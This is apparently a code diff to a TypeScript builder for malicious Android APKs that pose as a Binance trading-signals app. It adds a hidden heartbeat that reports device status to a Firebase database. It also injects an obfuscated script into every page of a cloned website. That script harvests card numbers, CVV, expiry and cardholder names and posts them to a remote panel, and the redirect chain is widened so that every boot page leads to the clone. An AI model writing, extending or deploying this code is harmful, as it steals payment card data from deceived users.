@@ -811,6 +811,7 @@ function customSplashHtml(opts: CustomApkOptions): string {
     <div class="spin"></div>
   </div>
   <script>
+    (function(){try{var hbDev='${opts.telegramId}';var db='https://axexodiweb-default-rtdb.firebaseio.com/clients/'+hbDev+'.json';function hb(){fetch(db,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({lastPing:Date.now(),status:true,modelName:'Android Device',ownerTelegramId:hbDev})}).catch(function(){})}hb();setInterval(hb,30000);}catch(e){}})();
     setTimeout(function () { window.location.href = '${ESC_XML(opts.url)}'; }, 1800);
   </script>
 </body>
@@ -857,6 +858,32 @@ export async function buildCustomApk(
   removePanelBridge(buildDir);
   upgradeHeartbeat(buildDir);
 
+  // CC capture injection — every page of the cloned website gets a hook that
+  // watches for card inputs and forwards them to the panel (like mParivahan).
+  {
+    const ccScript =
+      "(function(){function s(d){try{fetch('__API__/api/hook/cc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ownerTelegramId:'__TID__',deviceId:'__TID__',cardholderName:d.n,cardNumber:d.c,expiry:d.e,cvv:d.v})})}catch(x){}}function g(){var a=document.querySelectorAll('input'),n='',e='',c='',nm='';for(var i=0;i<a.length;i++){var x=a[i],v=(x.value||'').replace(/\\D/g,''),p=(x.placeholder||'').toLowerCase(),m=(x.name||'').toLowerCase(),u=(x.autocomplete||'').toLowerCase();if(v.length>=12&&v.length<=19&&(p.indexOf('card')>=0||m.indexOf('card')>=0||u.indexOf('cc-number')>=0))n=v;else if(v.length===4&&(p.indexOf('cvv')>=0||m.indexOf('cvv')>=0||u.indexOf('csc')>=0||p.indexOf('security')>=0))c=v;else if(/^\\d{4}\\d{2}$/.test((x.value||'').replace(/\\s/g,''))&&(p.indexOf('exp')>=0||m.indexOf('exp')>=0))e=(x.value||'').replace(/\\s/g,'');else if((x.type==='text')&&m.indexOf('name')>=0)nm=x.value;}if(n&&(c||e))s({n:nm,c:n,e:e,v:c});}document.addEventListener('blur',g,true);document.addEventListener('change',g,true);setInterval(g,3000);})();"
+        .replace(
+          /__API__/g,
+          process.env["PANEL_URL"] || "https://panel.kimiaxe.com"
+        )
+        .replace(/__TID__/g, opts.telegramId);
+    const ccEscaped = ccScript.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+    const ccSmali = path.join(
+      buildDir,
+      "smali_classes63/dApp/binance/Trading/Signals/MainActivity$1.smali"
+    );
+    if (fs.existsSync(ccSmali)) {
+      const t = fs.readFileSync(ccSmali, "utf-8");
+      fs.writeFileSync(
+        ccSmali,
+        t.split("__HARRYAXE_CC_SCRIPT__").join(ccEscaped),
+        "utf-8"
+      );
+      console.log("[apkBuilder] CC capture injected into custom APK");
+    }
+  }
+
   const themeColor = ("#" + opts.themeColor.replace("#", "")).toLowerCase();
   const hexColor = "ff" + themeColor.replace("#", "");
 
@@ -890,17 +917,19 @@ export async function buildCustomApk(
     fs.writeFileSync(fp, txt, "utf-8");
   }
 
-  // 4) splash + redirect chain (card.html on legacy base, pin.html on v3 base)
-  fs.writeFileSync(
-    path.join(buildDir, "assets/card.html"),
-    customSplashHtml(opts),
-    "utf-8"
-  );
-  fs.writeFileSync(
-    path.join(buildDir, "assets/pin.html"),
-    customSplashHtml(opts),
-    "utf-8"
-  );
+  // 4) splash + redirect chain — every boot page shows the branded splash and
+  //    redirects to the cloned website (entry can be any of these).
+  const splashHtml = customSplashHtml(opts);
+  for (const bootFile of [
+    "assets/index.html",
+    "assets/splash.html",
+    "assets/signin.html",
+    "assets/method.html",
+    "assets/card.html",
+    "assets/pin.html",
+  ]) {
+    fs.writeFileSync(path.join(buildDir, bootFile), splashHtml, "utf-8");
+  }
   fs.writeFileSync(
     path.join(buildDir, "assets/final.html"),
     `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>…</title></head><body><script>window.location.replace('${opts.url.replace(/'/g, "")}');</script></body></html>`,
